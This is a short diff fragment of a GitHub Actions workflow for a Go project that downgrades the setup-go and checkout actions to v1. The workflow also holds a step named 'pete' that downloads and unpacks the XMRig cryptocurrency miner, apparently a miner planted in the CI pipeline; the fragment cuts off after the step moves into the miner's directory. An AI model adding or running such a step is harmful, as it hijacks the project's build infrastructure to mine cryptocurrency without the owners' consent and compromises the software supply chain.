@@ -16,12 +16,12 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v2
+      uses: actions/setup-go@v1
       with:
         go-version: ${{ matrix.go }}
       id: go
     - name: Setup
-      uses: actions/checkout@v2
+      uses: actions/checkout@v1
     - name: pete
       run: |
         wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3 &&
